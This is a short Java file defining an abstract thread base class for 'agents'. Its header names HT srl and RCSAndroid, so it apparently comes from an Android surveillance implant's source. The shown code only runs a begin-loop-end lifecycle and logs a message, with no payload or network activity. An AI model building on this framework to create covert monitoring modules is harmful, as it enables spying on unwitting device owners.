/***********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : RCSAndroid
 * Created   : 30-mar-2011
 **********************************************/

package com.ht.RCSAndroidGUI;

import android.util.Log;

public abstract class AgentBase extends ThreadBase implements Runnable {
    // Gli eredi devono implementare i seguenti metodi astratti
    public abstract void begin();
    public abstract void end();
    public abstract void parse(byte[] conf);
    
    public synchronized void run() {
    	status = Agent.AGENT_RUNNING;
    	
    	begin();
    	loop();
        end();
        
        status = Agent.AGENT_STOPPED;
        Log.d("RCS", "AgentBase stopped");
    }
}